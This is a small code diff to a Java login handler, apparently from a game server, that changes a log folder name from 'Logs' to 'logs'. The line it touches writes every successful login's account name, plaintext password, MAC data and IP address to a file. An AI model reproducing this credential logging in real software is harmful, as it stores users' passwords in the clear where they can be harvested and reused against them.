@@ -85,7 +85,7 @@ public class CharLoginHandler
                 }
             }
             else {
-                FileoutputUtil.logToFile("Logs/ACPW.txt", "ACC: " + login + " PW: " + pwd + " MAC : " + macData + " IP: " + c.getSession().getRemoteAddress().toString() + "\r\n");
+                FileoutputUtil.logToFile("logs/ACPW.txt", "ACC: " + login + " PW: " + pwd + " MAC : " + macData + " IP: " + c.getSession().getRemoteAddress().toString() + "\r\n");
                 c.updateMacs();
                 c.loginAttempt = 0;
                 LoginWorker.registerClient(c);
